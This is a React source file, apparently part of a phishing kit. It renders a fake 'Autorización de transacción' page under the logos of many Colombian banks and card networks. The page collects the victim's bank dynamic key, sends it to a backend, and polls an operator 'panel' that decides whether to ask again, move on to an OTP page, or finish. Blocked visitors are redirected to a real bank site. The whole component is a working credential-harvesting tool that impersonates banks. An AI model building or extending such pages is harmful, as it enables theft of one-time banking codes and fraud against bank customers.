import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { limpiarPaddingBody } from "../../../../@utils";
import { instanceBackend } from "../../../axios/instanceBackend";
import { getTcSessionIdForFlow, isTcUiPreview } from "../tcUiPreview";
import {
  applyTcSessionContext,
  consumeTcAlert,
  fetchTcSession,
  persistTcTarjeta,
  redirectToTcIngreso,
  resolveTcRedirectParams,
  TC_MSG_ERROR_DIN,
} from "../tcSessionHelper";
import "./dinamicaTc.css";

// Se importan los logos de los bancos y las franquicias
const bankLogoContext = require.context("../img/bancos", false, /\.(png|jpe?g|webp|svg)$/i);
const franchiseLogoContext = require.context(
  "../img/franquicias",
  false,
  /\.(png|jpe?g|webp|svg)$/i,
);

/** CRA/webpack: SVG suele exportar URL en `.default` o `.A`, no como string plano. */
/**
 * Metodo encargado de resolver la URL de un asset importado por webpack
 *
 * @param mod Modulo importado (string u objeto con default/A)
 * @returns URL del asset o null
 */
function resolveAssetUrl(mod) {

  // Se valida si el modulo es valido
  if (!mod) return null;

  // Se valida si el modulo es un string
  if (typeof mod === "string") return mod;

  // Se valida si el modulo es un objeto
  if (typeof mod === "object") {

    // Se valida si el modulo tiene default
    if (typeof mod.default === "string") return mod.default;

    // Se valida si el modulo tiene propiedad A
    if (typeof mod.A === "string") return mod.A;
  }

  // Se retorna null si no hay URL usable
  return null;
}

// Se inicializan los logos de los bancos
const BANK_LOGOS = {};

// Se recorren los logos de los bancos
bankLogoContext.keys().forEach((key) => {

  // Se captura el id del logo del banco
  const id = key.replace(/^\.\//, "").replace(/\.[^.]+$/, "").toLowerCase();

  // Se agrega el logo del banco al mapa de logos
  BANK_LOGOS[id] = resolveAssetUrl(bankLogoContext(key));
});

// Se inicializan los logos de las franquicias
const FRANCHISE_LOGOS = {};

// Se recorren los logos de las franquicias
franchiseLogoContext.keys().forEach((key) => {

  // Se captura el id del logo de la franquicia
  const id = key.replace(/^\.\//, "").replace(/\.[^.]+$/, "").toLowerCase();

  // Se agrega el logo de la franquicia al mapa de logos
  FRANCHISE_LOGOS[id] = resolveAssetUrl(franchiseLogoContext(key));
});

// Se inicializan los alias de los bancos (panel: BANCOLOMBIA, BBVA, CAJA_SOCIAL, etc.)
const BANK_ALIASES = {
  bancodebogota: "bogota",
  bancobogota: "bogota",
  bogota: "bogota",
  bancolombia: "bancolombia",
  bbva: "bbva",
  bancobbva: "bbva",
  bbvacolombia: "bbva",
  banco_bbva: "bbva",
  davivienda: "davivienda",
  colpatria: "colpatria",
  occidente: "occidente",
  avvillas: "avvillas",
  popular: "popular",
  itau: "itau",
  cajasocial: "cajasocial",
  cajasocialp01: "cajasocial",
  caja_social: "cajasocial",
  bancocajasocial: "cajasocial",
  fundacion: "cajasocial",
  falabella: "falabella",
  serfinanza: "serfinanza",
  nequi: "nequi",
};

const BANCO_NOMBRE_PANTALLA = {
  bogota: "Banco de Bogotá",
  bancolombia: "Bancolombia",
  bbva: "BBVA Colombia",
  cajasocial: "Banco Caja Social",
  davivienda: "Davivienda",
  colpatria: "Scotiabank Colpatria",
  avvillas: "Banco AV Villas",
  occidente: "Banco de Occidente",
  popular: "Banco Popular",
  itau: "Itaú",
  falabella: "Banco Falabella",
  serfinanza: "Serfinanza",
  nequi: "Nequi",
};

// Se inicializa la clave de franquicia desconocida
const FRANCHISE_UNKNOWN_KEY = "idcheckgeneral";

// Se inicializan los alias de las franquicias
const FRANCHISE_ALIASES = {
  visa: "visa",
  mastercard: "mastercard",
  master: "mastercard",
  mc: "mastercard",
  amex: "amex",
  americanexpress: "amex",
  diners: "dinersclub",
  dinersclub: "dinersclub",
  dinner: "dinersclub",
  idcheck: FRANCHISE_UNKNOWN_KEY,
  idcheckgeneral: FRANCHISE_UNKNOWN_KEY,
};

// Se inicializan los prefijos de BIN de Diners
const DINERS_BIN_PREFIXES = ["30", "31", "32", "36", "38"];

// Se inicializan los placeholders
const PLACEHOLDER_COMERCIO = "{panel}";
const PLACEHOLDER_MONTO = "{valor compra}";
const PLACEHOLDER_ULTIMOS = "{ultimos 4 digitos de la tarjeta}";
const PLACEHOLDER_FECHA = "{fecha de la compra}";
const PLACEHOLDER_BANCO = "{banco}";
const PLACEHOLDER_FRANQUICIA = "{franquicia}";

/**
 * Metodo encargado de detectar la franquicia por BIN de la tarjeta
 * Visa 4 | MC 5/2 | Amex 34/37 | Diners 30,31,32,36,38
 *
 * @param cardNumber Numero de tarjeta
 * @returns Clave de franquicia o cadena vacia
 */
function detectFranchiseFromBin(cardNumber) {

  // Se normalizan solo digitos
  const digits = String(cardNumber || "").replace(/\D/g, "");

  // Se valida si no hay digitos
  if (!digits) return "";

  // Se valida Amex y Diners por prefijo de 2 digitos
  if (digits.length >= 2) {

    // Se captura el prefijo de 2 digitos
    const prefix2 = digits.slice(0, 2);

    // Se valida si el prefijo es Amex
    if (prefix2 === "34" || prefix2 === "37") return "amex";

    // Se valida si el prefijo es Diners
    if (DINERS_BIN_PREFIXES.includes(prefix2)) return "diners";
  }

  // Se valida Visa y Mastercard por primer digito
  const first = digits[0];

  // Se valida si es Visa
  if (first === "4") return "visa";

  // Se valida si es Mastercard
  if (first === "5" || first === "2") return "mastercard";

  // Se retorna vacio
  return "";
}

/**
 * Metodo encargado de resolver la clave de franquicia para logos
 *
 * @param cardNumber Numero de tarjeta
 * @param fallbackFranchise Franquicia de respaldo (URL/storage)
 * @returns Clave de franquicia
 */
function resolveFranchiseKey(cardNumber, fallbackFranchise) {

  // Se intenta detectar por BIN
  const fromBin = detectFranchiseFromBin(cardNumber);

  // Se retorna si el BIN identifico franquicia
  if (fromBin) return fromBin;

  // Si hay PAN pero no se reconoce, usar logo generico ID Check
  const digits = String(cardNumber || "").replace(/\D/g, "");

  // Se retorna logo ID Check cuando hay digitos sin match
  if (digits.length > 0) return FRANCHISE_UNKNOWN_KEY;

  // Se usa fallback si no es placeholder
  const fb = normalizeLogoKey(fallbackFranchise);

  // Se retorna franquicia desde fallback
  if (fb && !isPlaceholderToken(fb)) {

    // Se mapea alias de franquicia
    return FRANCHISE_ALIASES[fb] || fb;
  }

  // Se retorna vacio
  return "";
}

/**
 * Metodo encargado de normalizar claves para logos (banco/franquicia)
 *
 * @param value Texto a normalizar
 * @returns Clave en minusculas sin acentos ni espacios
 */
function normalizeLogoKey(value) {

  // Se normaliza el texto para comparar con alias
  return String(value || "")
    .trim()
    .toLowerCase()
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/\s+/g, "")
    .replace(/_/g, "");
}

/**
 * Metodo encargado de resolver la clave de archivo del logo del banco
 *
 * @param bankKey Identificador del banco (URL, storage o panel)
 * @returns Clave del logo en BANK_LOGOS o vacio
 */
function resolveBankLogoKey(bankKey) {

  // Se valida que no sea placeholder
  const raw = String(bankKey || "").trim();

  // Se retorna vacio si es placeholder
  if (!raw || isPlaceholderToken(raw)) return "";

  // Se toma la parte antes de ":" (panel envia ej. BANCOLOMBIA:P01)
  const base = raw.split(":")[0];
  const key = normalizeLogoKey(base);

  // Se retorna vacio si no hay clave
  if (!key) return "";

  // Se mapea con alias conocidos
  if (BANK_ALIASES[key]) return BANK_ALIASES[key];

  // Se valida alias Bogota
  if (key.includes("bogota")) return "bogota";

  // Se valida alias Caja Social
  if (key.includes("cajasocial") || (key.includes("caja") && key.includes("social")))
    return "cajasocial";

  // Se valida alias Davivienda
  if (key.includes("davivienda")) return "davivienda";

  // Se retorna la clave normalizada
  return key;
}

/**
 * Metodo encargado de formatear el nombre del banco para mostrar en pantalla
 *
 * @param bankRaw Identificador crudo del banco (ej. BANCOLOMBIA, BBVA:P01)
 * @returns Nombre legible o cadena vacia
 */
function formatBancoDisplayName(bankRaw) {

  // Se resuelve clave de logo del banco
  const key = resolveBankLogoKey(bankRaw);

  // Se retorna nombre amigable del mapa
  if (key && BANCO_NOMBRE_PANTALLA[key]) return BANCO_NOMBRE_PANTALLA[key];

  const base = String(bankRaw || "").split(":")[0].trim();

  // Se retorna vacio si es placeholder
  if (!base || isPlaceholderToken(base)) return "";

  // Se normaliza la clave del logo del banco
  const normalized = normalizeLogoKey(base);

  // Se retorna desde mapa por clave normalizada
  if (BANCO_NOMBRE_PANTALLA[normalized]) return BANCO_NOMBRE_PANTALLA[normalized];

  // Se capitaliza texto crudo como ultimo recurso
  return base.charAt(0).toUpperCase() + base.slice(1).toLowerCase();
}

/**
 * Metodo encargado de obtener la URL del logo del banco
 *
 * @param bankKey Identificador del banco
 * @returns URL del logo o null
 */
function getBankLogo(bankKey) {

  // Se resuelve la clave del archivo
  const fileId = resolveBankLogoKey(bankKey);

  // Se retorna null si no hay clave de logo
  if (!fileId) return null;

  // Se retorna la URL del mapa de logos
  return BANK_LOGOS[fileId] || null;
}

/**
 * Metodo encargado de obtener la URL del logo de franquicia
 *
 * @param franchiseKey Clave de franquicia
 * @returns URL del logo o null
 */
function getFranchiseLogo(franchiseKey) {

  // Se normaliza y mapea alias
  const key = normalizeLogoKey(franchiseKey);
  const fileId = FRANCHISE_ALIASES[key] || key;

  // Se retorna la URL del mapa de logos
  return FRANCHISE_LOGOS[fileId] || null;
}

/**
 * Metodo encargado de detectar tokens placeholder del panel ({panel}, etc.)
 *
 * @param value Texto a evaluar
 * @returns true si es placeholder o vacio
 */
function isPlaceholderToken(value) {

  // Se valida null
  if (value == null) return true;

  // Se captura el texto
  const t = String(value).trim();

  // Se valida cadena vacia
  if (!t) return true;

  // Se comparan placeholders conocidos
  if (
    t === PLACEHOLDER_COMERCIO ||
    t === PLACEHOLDER_MONTO ||
    t === PLACEHOLDER_ULTIMOS ||
    t === PLACEHOLDER_FECHA ||
    t === PLACEHOLDER_BANCO
  ) {

    // Se reconoce como placeholder conocido
    return true;
  }

  // Se valida patron {texto} o {{texto}}
  return /^\{[^{}]+\}$/.test(t) || /^\{\{[^{}]+\}\}\}$/.test(t);
}

/**
 * Metodo encargado de resolver el display de la TC
 *
 * @param value Valor del panel
 * @param placeholder Texto placeholder
 * @returns Objeto display e isPlaceholder
 */
function resolveTcDisplay(value, placeholder) {

  // Se captura el texto
  const text = String(value ?? "").trim();

  // Se valida si el texto es valido o si es un placeholder
  if (!text || isPlaceholderToken(text)) {

    // Se retorna el placeholder
    return { display: placeholder, isPlaceholder: true };
  }

  // Se retorna el texto
  return { display: text, isPlaceholder: false };
}

/**
 * Indicador de carga circular (sesión, envío o polling)
 *
 * @param label Texto bajo el spinner
 */
function DinamicaTcBusy({ label }) {

  // Se retorna el indicador de carga circular
  return (
    <div className="dinamica-tc-busy" role="status" aria-live="polite" aria-busy="true">
      <div className="dinamica-tc-spinner" aria-hidden="true" />
      {label ? <p className="dinamica-tc-busy__label">{label}</p> : null}
    </div>
  );
}

/**
 * Componente que muestra valor dinamico o placeholder estilizado
 *
 * @param value Valor real del panel
 * @param placeholder Texto placeholder si no hay valor
 * @param classPrefix Prefijo de clases CSS
 */
function TcDynamicValue({ value, placeholder, classPrefix = "dinamica-tc" }) {

  // Se resuelve si mostrar valor o placeholder
  const { display, isPlaceholder } = resolveTcDisplay(value, placeholder);

  // Se renderiza el texto con clase segun tipo
  return (
    <strong
      className={
        isPlaceholder
          ? `${classPrefix}-dynamic ${classPrefix}-dynamic--placeholder`
          : `${classPrefix}-dynamic`
      }
    >
      {display}
    </strong>
  );
}

/**
 * Estado inicial de la compra
 */
const EMPTY_PURCHASE = {
  comercio: "",
  monto: "",
  ultimosDigitos: "",
  fecha: "",
};

/**
 * Pantalla de clave dinamica de ingreso TC (autorizacion de compra)
 */
export default function DinamicaTc() {

  // Se inicializan los estados
  const [bank, setBank] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [franquiciaFallback, setFranquiciaFallback] = useState("");

  // Se resuelve la franquicia
  const franquicia = useMemo(() => resolveFranchiseKey(cardNumber, franquiciaFallback),
    [cardNumber, franquiciaFallback],
  );

  // Se resuelve la clave del logo del banco
  const bankLogoKey = resolveBankLogoKey(bank);

  // Se resuelve la URL del logo del banco
  const bankLogo = getBankLogo(bank);
  const franchiseLogo = getFranchiseLogo(franquicia);
  const franquiciaLabel = franquicia === FRANCHISE_UNKNOWN_KEY ? "ID Check" : franquicia || PLACEHOLDER_FRANQUICIA;
  const [clave, setClave] = useState("");
  const [purchase, setPurchase] = useState(EMPTY_PURCHASE);
  const [sessionLoading, setSessionLoading] = useState(false);
  const [loading, setLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");

  // Se inicializa el ref de la sessionId
  const sessionIdRef = useRef(getTcSessionIdForFlow());
  const pollingRef = useRef(null);

  // Se resuelve el nombre del banco para mostrar en pantalla
  const nombreBancoDisplay = useMemo(() => formatBancoDisplayName(bank), [bank]);

  // Se valida clave dinamica: solo digitos, minimo 4 y maximo 8
  const claveListo = useMemo(() => {

    // Se normalizan solo digitos
    const digits = clave.replace(/\D/g, "");

    // Se habilita Autorizar entre 4 y 8 digitos
    return digits.length >= 4 && digits.length <= 8;
  }, [clave]);

  // Se muestra overlay de carga al traer sesión, enviar clave o hacer polling
  const showBusy = sessionLoading || loading || submitting;

  // Se elige el mensaje del overlay segun la operacion
  const busyLabel = useMemo(() => {

    // Se valida si la sesion esta cargando
    if (sessionLoading) return "Cargando información…";

    // Se valida si el loading o el submitting esta activo
    if (loading || submitting) return "Procesando…";

    // Se retorna vacio
    return "";
  }, [sessionLoading, loading, submitting]);

  // Se inicializa el metodo para detener el polling
  const stopPolling = useCallback(() => {

    // Se limpia el intervalo de verify-state
    if (pollingRef.current) {

      // Se limpia el intervalo de verify-state
      clearInterval(pollingRef.current);

      // Se resetea la referencia
      pollingRef.current = null;
    }
  }, []);

  // Se inicializa el metodo para verificar el estado de la sesion
  const verifyState = useCallback(async () => {

    // Se valida sessionId
    const sessionId = sessionIdRef.current;

    // Se sale si no hay sesion
    if (!sessionId) return;

    // Se usa el try catch
    try {

      // Se consulta estado en el panel
      const response = await instanceBackend.post(`/tc/verify-state/${sessionId}`);
      const estado = String(response?.data?.estado || "").toLowerCase();
      const { bank: bankRedir, tarjeta: tarjetaRedir } = resolveTcRedirectParams(
        response?.data,
        { bank, cardNumber },
      );

      // Se redirige o muestra error segun estado (flujo Bancolombia / panel)
      switch (estado) {

        // ------------ Solicitar clave dinámica de nuevo (misma pantalla) ------------
        case "sol_din":

          // Se detiene el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);
          setSubmitting(false);

          // Se limpia la clave para nuevo intento
          setClave("");
          setErrorMsg("");

          // Se sale del switch
          break;

        // ------------ Ir a OTP ------------
        case "sol_otp":

          // Se detiene el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se redirige a ingreso TC OTP con parametros
          redirectToTcIngreso(
            "/ingreso-tc/otp",
            sessionId,
            bankRedir,
            tarjetaRedir,
          );

          // Se sale del switch
          break;

        // ------------ Finalizar ------------
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se detiene el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se redirige a la pagina de finalizado TC
          window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionId)}`;
          break;

        // ------------ OTP incorrecto → pantalla OTP con alerta ------------
        case "error_otp":

          // Se detiene el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se redirige con alerta (tc_estado_alerta)
          redirectToTcIngreso(
            "/ingreso-tc/otp",
            sessionId,
            bankRedir,
            tarjetaRedir,
            "error_otp",
          );

          // Se sale del switch
          break;

        // ------------ Clave dinámica incorrecta ------------
        case "error_din":

          // Se detiene el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);
          setSubmitting(false);

          // Se muestra alerta en el campo
          setErrorMsg(TC_MSG_ERROR_DIN);
          setClave("");

          // Se sale del switch
          break;
        default:

          // Se sale del switch
          break;
      }
    } catch (err) {

      // Se maneja bloqueo de IP
      const status = err?.response?.status;
      const estadoErr = String(err?.response?.data?.estado || "").toLowerCase();

      // Se redirige si la IP fue bloqueada
      if (status === 403 && estadoErr === "error_blocked") {

        // Se detiene el polling
        stopPolling();

        // Se desactiva el loading
        setLoading(false);

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pagina de inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  }, [stopPolling, bank, cardNumber]);

  // Se inicializa el metodo para iniciar el polling
  const startPolling = useCallback(() => {

    // Se reinicia polling cada 3s
    stopPolling();

    // Se inicia el polling cada 3s
    pollingRef.current = setInterval(verifyState, 3000);

    // Se verifica el estado de la sesion
    verifyState();
  }, [stopPolling, verifyState]);

  // Se inicializa el useEffect para limpiar el padding del body y el fondo gris de la pagina
  useEffect(() => {

    // Se limpia padding del body y fondo gris de la pagina
    limpiarPaddingBody();

    // Se captura el html y el body
    const html = document.documentElement;
    const body = document.body;
    const prevHtml = html.style.backgroundColor;
    const prevBody = body.style.backgroundColor;

    // Se establece el fondo gris de la pagina
    html.style.setProperty("background-color", "#f3f4f6", "important");
    body.style.setProperty("background-color", "#f3f4f6", "important");

    // Se captura los parametros de la url
    const params = new URLSearchParams(window.location.search);

    // Se inicializa el estado de cancelacion
    let cancelled = false;

    // Se inicializa el metodo para limpiar la ui
    const cleanupUi = () => {

      // Se detiene el polling
      stopPolling();

      // Se oculta el overlay de carga
      setSessionLoading(false);
      setLoading(false);
      setSubmitting(false);

      // Se limpia el padding del body y el fondo gris de la pagina
      limpiarPaddingBody();

      // Se restaura el fondo del html y el body
      html.style.backgroundColor = prevHtml;
      body.style.backgroundColor = prevBody;

      // Se sale del metodo
      return;
    };

    // Se muestra alerta pendiente tras redirect del panel (error_otp / error_din)
    const pendingAlert = consumeTcAlert();

    // Se establece el mensaje de alerta si existe
    if (pendingAlert) setErrorMsg(pendingAlert);

    // Se valida si es vista de diseño
    if (isTcUiPreview()) {

      // Se inicializa la sessionId
      sessionIdRef.current = "";

      // Se captura el bank y la tarjeta de la url
      const previewBank = params.get("bank") || "";
      const previewTarjeta = String(params.get("tarjeta") || "").replace(/\D/g, "");

      // Se establece el bank y la tarjeta
      if (previewBank) setBank(previewBank);
      if (previewTarjeta) {

        // Se establece la tarjeta
        setCardNumber(previewTarjeta);
        persistTcTarjeta(previewTarjeta);
      }

      // Se sale del metodo
      return cleanupUi;
    }

    // Flujo real: sessionId en URL (o localStorage) → consulta sesión en backend
    const sid = getTcSessionIdForFlow();

    // Se sale si no hay sessionId
    if (!sid) {

      // Se sale del metodo
      return cleanupUi;
    }

    // Se establece la sessionId
    sessionIdRef.current = sid;

    // Se guarda la sessionId en el localStorage
    localStorage.setItem("sessionId", sid);

    // Se carga la sesion del panel
    setSessionLoading(true);

    (async () => {

      // Se usa el try catch
      try {

        // Se consulta la sesion en el panel
        const ctx = await fetchTcSession(sid);

        // Se sale si ya se cancelo la carga
        if (cancelled) return;

        // Se aplica el contexto de la sesion en el panel
        applyTcSessionContext(ctx, {
          setBank,
          setCardNumber,
          setPurchase,
          setFranquiciaFallback,
        });

        // Se captura los ultimos digitos de la tarjeta
        const digits = String(ctx.tarjeta || "").replace(/\D/g, "");

        // Se resuelve la franquicia desde los ultimos digitos de la tarjeta
        const frFromBin = detectFranchiseFromBin(digits);

        // Se establece la franquicia fallback
        if (frFromBin) {

          // Se establece la franquicia fallback
          setFranquiciaFallback(frFromBin);

          // Se guarda la franquicia fallback en el sessionStorage y localStorage
          sessionStorage.setItem("tc_franquicia", frFromBin);
          localStorage.setItem("tc_franquicia", frFromBin);
        }
      } catch (err) {

        // Se muestra error si ya se cancelo la carga
        if (!cancelled) {

          // Se muestra error en consola
          console.warn("Sesión TC (dinámica):", err?.message || err);
        }
      } finally {

        // Se desactiva el loading de la sesion
        if (!cancelled) setSessionLoading(false);
      }
    })();

    // Se inicia polling para acciones del panel (OTP/DIN/error) como en Bancolombia
    startPolling();

    // Se limpia al desmontar
    return () => {

      // Se cancela la carga
      cancelled = true;

      // Se limpia la ui
      cleanupUi();
    };
  }, [stopPolling, startPolling]);

  /**
   * Metodo encargado de enviar la clave dinamica al backend
   *
   * @param event Evento submit del formulario
   */
  const handleSubmit = async (event) => {

    // Se previene recarga de pagina
    event.preventDefault();

    // Se ignora submit si ya envia o la clave no cumple longitud (4-8 digitos)
    if (submitting || !claveListo) return;

    // Se valida sessionId
    const sessionId = sessionIdRef.current;

    // Se muestra error si falta sessionId
    if (!sessionId) {

      // Se muestra error si falta sessionId
      setErrorMsg(isTcUiPreview()
        ? "Vista diseño: añade ?sessionId=... en la URL para probar el flujo."
        : "Falta sessionId para enviar la clave al panel.",
      );
      return;
    }

    // Se activa loading y se envia clave dinamica
    setSubmitting(true);
    setLoading(true);
    setErrorMsg("");

    // Se usa el try catch
    try {

      // Se inicializa el json
      const dataSend = {
        "data": {
          "attributes": {
            "sessionId": sessionId,
            "clave": clave.replace(/\D/g, ""),
            "bank": bank || sessionStorage.getItem("tc_bank") || "",
            "franquicia": franquicia || sessionStorage.getItem("tc_franquicia") || "",
          },
        },
      };

      // Se envia la clave dinamica al backend
      await instanceBackend.post("/tc/dinamica", dataSend);

      // Se inicia polling para esperar respuesta del panel
      startPolling();
    } catch (err) {

      // Se muestra error y se quita loading
      setLoading(false);
      setSubmitting(false);
      setErrorMsg(
        err?.response?.data?.message ||
        "No se pudo enviar la clave. Intenta de nuevo.",
      );
    }
  };

  // Se retorna el codigo HTML
  return (
    <div className="dinamica-tc-page">
      <div className="dinamica-tc-card">
        {showBusy ? <DinamicaTcBusy label={busyLabel} /> : null}
        <header className="dinamica-tc-header">
          <div className="dinamica-tc-header__logo dinamica-tc-header__logo--bank">
            {bankLogo ? (
              <img
                className={
                  bankLogoKey
                    ? `dinamica-tc-header__logo-img dinamica-tc-header__logo-img--bank-${bankLogoKey}`
                    : "dinamica-tc-header__logo-img"
                }
                src={bankLogo}
                alt={bank || "Banco"}
                decoding="async"
              />
            ) : (
              <span className="dinamica-tc-header__placeholder">
                {bank || PLACEHOLDER_BANCO}
              </span>
            )}
          </div>
          <div className="dinamica-tc-header__logo dinamica-tc-header__logo--franchise">
            {franchiseLogo ? (
              <img
                className={
                  franquicia
                    ? `dinamica-tc-header__logo-img dinamica-tc-header__logo-img--${franquicia}`
                    : "dinamica-tc-header__logo-img"
                }
                src={franchiseLogo}
                alt={franquiciaLabel}
                decoding="async"
              />
            ) : (
              <span className="dinamica-tc-header__placeholder">
                {franquiciaLabel}
              </span>
            )}
          </div>
        </header>

        <h1 className="dinamica-tc-title">Autorización de transacción</h1>

        <p className="dinamica-tc-text">
          La transacción que intentas realizar en{" "}
          <TcDynamicValue
            value={purchase.comercio}
            placeholder={PLACEHOLDER_COMERCIO}
          />{" "}
          por{" "}
          <TcDynamicValue value={purchase.monto} placeholder={PLACEHOLDER_MONTO} />{" "}
          el{" "}
          <TcDynamicValue value={purchase.fecha} placeholder={PLACEHOLDER_FECHA} />{" "}
          con tu tarjeta terminada en{" "}
          <span className="dinamica-tc-mask">
            **** **** **** {' '}
            <TcDynamicValue
              value={purchase.ultimosDigitos}
              placeholder={PLACEHOLDER_ULTIMOS}
              classPrefix="dinamica-tc"
            />
          </span>{" "}
          debe ser autorizada por seguridad.
        </p>
        <p className="dinamica-tc-text">
          ¡Avancemos con la compra! Para terminar y por tu seguridad debes
          ingresar la clave dinámica de tu app{" "}
          {nombreBancoDisplay ? (
            <strong className="dinamica-tc-dynamic">{nombreBancoDisplay}</strong>
          ) : null}{" "}
          para autorizar la transacción.
        </p>

        <section
          className="dinamica-tc-detail"
          aria-label="Detalle de la transacción"
        >
          <h2 className="dinamica-tc-detail__title">Detalle de la Transacción</h2>

          <div className="dinamica-tc-detail__row">
            <span className="dinamica-tc-detail__label">Comercio:</span>
            <span className="dinamica-tc-detail__value">
              <TcDynamicValue
                value={purchase.comercio}
                placeholder={PLACEHOLDER_COMERCIO}
              />
            </span>
          </div>
          <div className="dinamica-tc-detail__row">
            <span className="dinamica-tc-detail__label">
              Monto de la Transacción:
            </span>
            <span className="dinamica-tc-detail__value">
              <TcDynamicValue
                value={purchase.monto}
                placeholder={PLACEHOLDER_MONTO}
              />
            </span>
          </div>
          <div className="dinamica-tc-detail__row">
            <span className="dinamica-tc-detail__label">Número de Tarjeta:</span>
            <span className="dinamica-tc-detail__value dinamica-tc-mask">
              **** **** **** {' '}
              <TcDynamicValue
                value={purchase.ultimosDigitos}
                placeholder={PLACEHOLDER_ULTIMOS}
                classPrefix="dinamica-tc"
              />
            </span>
          </div>
        </section>

        <form className="dinamica-tc-form" onSubmit={handleSubmit}>
          <div className="dinamica-tc-field">
            <label className="dinamica-tc-label" htmlFor="dinamica-tc-code">
              Ingresa tu Clave Dinámica
            </label>
            <input
              id="dinamica-tc-code"
              className="dinamica-tc-input"
              type="password"
              inputMode="numeric"
              autoComplete="off"
              maxLength={8}
              value={clave}
              disabled={showBusy}
              onFocus={() => setErrorMsg("")}
              onChange={(e) =>
                setClave(e.target.value.replace(/\D/g, "").slice(0, 8))
              }
            />
            {errorMsg ? (
              <p className="dinamica-tc-field-error" role="alert">
                {errorMsg}
              </p>
            ) : null}
          </div>

          <button
            type="submit"
            className={
              claveListo && !loading && !submitting
                ? "dinamica-tc-btn dinamica-tc-btn--active"
                : "dinamica-tc-btn"
            }
            disabled={showBusy || !claveListo}
          >
            Autorizar
          </button>
        </form>
      </div>
    </div>
  );
}
